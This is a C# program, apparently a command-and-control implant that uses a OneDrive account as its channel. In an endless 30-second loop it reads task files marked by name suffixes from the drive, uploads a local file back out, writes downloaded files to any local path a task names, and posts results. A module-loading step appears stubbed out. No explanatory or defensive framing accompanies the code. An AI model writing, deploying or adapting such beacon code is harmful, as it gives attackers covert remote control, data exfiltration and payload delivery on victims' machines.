using System;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class CloudTasks {
    static async Task Main(string[] argument_array) {
        using var client = new HttpClient();
        client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue(
            "Bearer", Environment.GetEnvironmentVariable("DRIVE_TOKEN"));
        string root = "https://graph.microsoft.com/v1.0/me/drive";
        while (true) {
            using var listing = JsonDocument.Parse(await client.GetStringAsync(root + "/root/children"));
            foreach (var item in listing.RootElement.GetProperty("value").EnumerateArray()) {
                string name = item.GetProperty("name").GetString();
                string content = root + "/items/" + item.GetProperty("id").GetString() + "/content";
                if (name.EndsWith("0xA1")) {
                    byte[] module = await client.GetByteArrayAsync(content);
                    object result = module.Length;
                    await client.PutAsync(root + "/root:/" + name + "0xA2:/content",
                        new StringContent(Convert.ToString(result)));
                } else if (name.EndsWith("0xB3")) {
                    string path = await client.GetStringAsync(content);
                    byte[] data = File.ReadAllBytes("user-selected-backup.bin");
                    await client.PutAsync(root + "/root:/" + name + "0xB4:/content",
                        new ByteArrayContent(data));
                } else if (name.EndsWith("0xC5")) {
                    string[] task = (await client.GetStringAsync(content)).Split('\n');
                    File.WriteAllBytes(task[1], await client.GetByteArrayAsync(
                        root + "/items/" + task[0] + "/content"));
                    await client.PutAsync(root + "/root:/" + name + "0xC6:/content",
                        new StringContent("OK"));
                }
            }
            await Task.Delay(30000);
        }
    }
}
